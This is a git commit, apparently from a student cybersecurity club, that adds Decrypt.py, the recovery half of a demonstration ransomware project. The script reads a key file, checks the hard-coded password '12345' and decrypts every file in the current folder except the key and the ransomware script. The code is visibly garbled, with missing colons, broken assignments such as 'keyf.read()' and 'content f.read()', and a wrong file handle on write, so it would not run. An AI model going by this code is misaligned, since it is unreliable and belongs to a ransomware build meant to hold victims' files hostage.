269cbe2c7e27fd21ab54764489bf1ec4848c18fd
cyberhub-dseu <cyberhub.dseu@gmail.com>
2024-07-31 09:35:28 +0530

    Create Decrypt.py
    The main Python script monstrating the ransomware creation process.

---
+++ Decrypt.py
@@ -0,0 +1,29 @@
+from cryptography.fernet import Fernet
+
+import os
+
+with open('secret.key', 'rb') as ft
+
+keyf.read()
+
+secret="12345"
+
+user input ()
+
+if secret==user:
+
+for file in os.listdir():
+
+if file 'secret.key' or file == 'Ransomewere.py' or file "Decrypt.py":
+
+continue
+
+with open(file, 'rb') as f:
+
+content f.read()
+
+decrypt_content = Fernet (key).decrypt (content)
+
+with open(file, 'wb') as fs
+
+f.write (decrypt_content)
